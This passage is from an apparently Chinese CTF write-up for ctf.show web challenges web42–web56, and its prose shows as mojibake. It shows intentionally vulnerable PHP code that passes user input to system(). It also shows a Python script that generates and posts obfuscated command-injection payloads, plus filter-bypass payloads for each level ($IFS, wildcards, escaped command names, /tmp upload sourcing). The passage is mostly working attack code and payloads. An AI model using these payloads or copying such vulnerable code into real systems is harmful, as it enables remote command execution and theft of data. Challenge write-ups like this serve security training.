class="line">    _param_2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(Files[opcode], mode=<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                line = f.readline()</span><br><span class="line">                <span class="keyword">if</span> line == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> line[<span class="number">0</span>] == i:</span><br><span class="line">                    _param_1 += line[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                    _param_2 += line[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                    <span class="comment"># print(_param_1)</span></span><br><span class="line">                    <span class="comment"># print(_param_2)</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    _res = <span class="string">&#x27;(&quot;&#123;&#125;&quot;|&quot;&#123;&#125;&quot;)&#x27;</span>.<span class="built_in">format</span>(_param_1, _param_2)</span><br><span class="line">    <span class="keyword">return</span> _res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="comment"># opcode = int(input(&#x27;[+] Your Opcode: &#x27;))</span></span><br><span class="line">    opcode = <span class="number">1</span></span><br><span class="line">    <span class="comment"># preg = input(&#x27;\n[+] Your Pattern: &#x27;)</span></span><br><span class="line">    preg = <span class="string">&#x27;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#x27;</span></span><br><span class="line">    rce_cmd = RceCmdGen(opcode=opcode, pattern=preg)</span><br><span class="line">    rce_cmd.rce_gen()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        func = <span class="built_in">input</span>(<span class="string">&quot;\n[+] Your Function: &quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> func == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        cmd = <span class="built_in">input</span>(<span class="string">&quot;\n[+] Your Command: &quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> cmd == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        payload = action(func, opcode=opcode) + action(cmd, opcode=opcode)</span><br><span class="line">        data =&#123;</span><br><span class="line">            <span class="string">&#x27;c&#x27;</span>: urllib.parse.unquote(payload)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># response = requests.post(url=url+payload)</span></span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n[*] result:\n&quot;</span>+response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    hello()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)!=<span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[!] Need Url&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        url = sys.argv[<span class="number">1</span>]</span><br><span class="line">        main(url=url)</span><br></pre></td></tr></table></figure><h3 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h3><p>æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨å‘½ä»¤åˆ†éš”ç¬¦å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=cat flag.php;</span><br><span class="line">/?c=cat flag.php||</span><br></pre></td></tr></table></figure><h3 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†<code>cat</code>å’Œ<code>;</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=tac flag.php||</span><br></pre></td></tr></table></figure><h3 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/;|cat|flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=tac fla*||</span><br></pre></td></tr></table></figure><h3 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| /i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç©ºæ ¼è¢«è¿‡æ»¤äº†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=tac%09fla*||</span><br><span class="line">/?c=tac$IFS$fla*||</span><br><span class="line">/?c=tac$IFS$1fla*||</span><br></pre></td></tr></table></figure><h3 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=ls||</span><br><span class="line">å›æ˜¾flag.php index.php</span><br><span class="line">/?c=tac%09fla?????||</span><br><span class="line">/?c=tac%09fla?.php||</span><br></pre></td></tr></table></figure><h3 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>more:ä¸€é¡µä¸€é¡µçš„æ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹<br>less:ä¸ more ç±»ä¼¼<br>head:æŸ¥çœ‹å¤´å‡ è¡Œ<br>tac:ä»æœ€åä¸€è¡Œå¼€å§‹æ˜¾ç¤ºï¼Œå¯ä»¥çœ‹å‡º tac æ˜¯ cat çš„åå‘æ˜¾ç¤º<br>tail:æŸ¥çœ‹å°¾å‡ è¡Œ<br>nlï¼šæ˜¾ç¤ºçš„æ—¶å€™ï¼Œé¡ºä¾¿è¾“å‡ºè¡Œå·<br>od:ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼è¯»å–æ¡£æ¡ˆå†…å®¹<br>vi:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹<br>vim:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹<br>sort:å¯ä»¥æŸ¥çœ‹<br>uniq:å¯ä»¥æŸ¥çœ‹<br>file -f:æŠ¥é”™å‡ºå…·ä½“å†…å®¹<br>grep<br>åœ¨å½“å‰ç›®å½•ä¸­ï¼ŒæŸ¥æ‰¾åç¼€æœ‰ file å­—æ ·çš„æ–‡ä»¶ä¸­åŒ…å« test å­—ç¬¦ä¸²çš„æ–‡ä»¶ï¼Œå¹¶æ‰“å°å‡ºè¯¥å­—ç¬¦ä¸²çš„è¡Œã€‚æ­¤æ—¶ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š<br>grep test *file<br>strings</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=tac%09fla?.php||</span><br></pre></td></tr></table></figure><h3 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=tac%09fla?.php||</span><br></pre></td></tr></table></figure><h3 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=tac%09fla?.php||</span><br></pre></td></tr></table></figure><h3 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=tac&lt;&gt;fla\g.php||</span><br></pre></td></tr></table></figure><h3 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>tac</code>è¢«è¿‡æ»¤äº†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=t\ac&lt;&gt;fla\g.php||</span><br></pre></td></tr></table></figure><h3 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„<code>$</code>è¢«æ”¾å‡ºæ¥äº†ï¼Œè¿˜æœ‰<code>flag</code>åœ¨æ ¹ç›®å½•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=ta\c$&#123;IFS&#125;../../../fla\g||</span><br></pre></td></tr></table></figure><h3 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$d</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=ta\c$&#123;IFS&#125;fla\g.php</span><br></pre></td></tr></table></figure><h3 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=grep$&#123;IFS&#125;show$&#123;IFS&#125;fla?.php</span><br></pre></td></tr></table></figure><h3 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è™½ç„¶<code>ban</code>æ‰äº†æ‰€æœ‰çš„å­—æ¯ï¼Œä½†æ˜¯ç•™ä¸‹äº†æ•°å­—ï¼Œå¯ä»¥é€šè¿‡åŒ¹é…binä¸‹å­˜åœ¨çš„å‘½ä»¤è¿›è¡Œè¯»å–flag</p><blockquote><p>binä¸ºbinaryçš„ç®€å†™ï¼Œä¸»è¦æ”¾ç½®ä¸€äº›ç³»ç»Ÿçš„å¿…å¤‡æ‰§è¡Œæ¡£ä¾‹å¦‚:catã€cpã€chmod dfã€dmesgã€gzipã€killã€lsã€mkdirã€moreã€mountã€rmã€suã€tarã€base64ç­‰ã€‚<br>catæˆ–è€…lsç­‰ç­‰éƒ½å…¶å®æ˜¯ç®€å†™ï¼Œä¾‹å¦‚lså®Œæ•´å…¨ç§°åº”è¯¥æ˜¯&#x2F;bin&#x2F;ls</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=/???/????64 ????????</span><br></pre></td></tr></table></figure><h3 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†æ•°å­—å­—æ¯ä½†æ˜¯ç»™äº†<code>.</code>å’Œ<code>?</code></p><blockquote><p>PHPä¼šå°†æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ä¿å­˜åœ¨ä¸´æ—¶æ–‡ä»¶å¤¹ä¸‹ï¼Œé»˜è®¤çš„æ–‡ä»¶åæ˜¯&#x2F;tmp&#x2F;phpXXXXXXï¼Œæ–‡ä»¶åæœ€å6ä¸ªå­—ç¬¦æ˜¯éšæœºçš„å¤§å°å†™å­—æ¯ï¼Œæœ€åä¸€ä¸ªå­—æ¯å¤§æ¦‚ç‡æ˜¯å¤§å†™</p><p>.  ç›¸å½“äºsource å¯ä»¥æ‰§è¡Œæ–‡ä»¶ </p><p>&#96;&#96;å¯ä»¥æ‰§è¡Œå‘½ä»¤</p><p>[@-[]   å¯ä»¥è¡¨ç¤ºä»»æ„å¤§å†™å­—æ¯ </p><p>åœ¨ASCIIç ä¸­  @ &lt; A   , [  &gt; Z  ,</p></blockquote><p>ä»ç½‘ä¸Šæ‰¾ä¸€ä»½<a href="https://blog.csdn.net/Kracxi/article/details/121766050">ä¸Šä¼ ä»£ç </a></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>upload-POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://c170210b-f33a-4717-8667-50f3a7931dac.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>æ–‡ä»¶å:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;æäº¤&quot;</span>&gt;</span></span><br><span class="line">    ä¸Šä¼ çš„æ–‡ä»¶åœ¨ç½‘ç«™ç›®å½•ä¸‹</span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å‘åŒ…å³å¯</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?c=.%20/???/????????[@-[]</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>c170210b-f33a-4717-8667-50f3a7931dac.challenge.ctf.show</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: 